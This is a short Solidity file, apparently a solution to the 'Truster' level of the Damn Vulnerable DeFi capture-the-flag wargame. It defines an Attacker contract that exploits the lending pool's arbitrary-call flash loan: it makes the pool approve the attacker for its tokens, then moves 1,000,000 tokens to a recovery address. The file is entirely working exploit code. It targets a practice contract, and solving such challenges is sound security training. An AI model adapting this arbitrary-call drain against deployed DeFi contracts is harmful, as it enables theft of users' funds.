// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;
import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attacker {
    function attack(TrusterLenderPool pool, DamnValuableToken token, address recovery) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000e18);
        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }
}
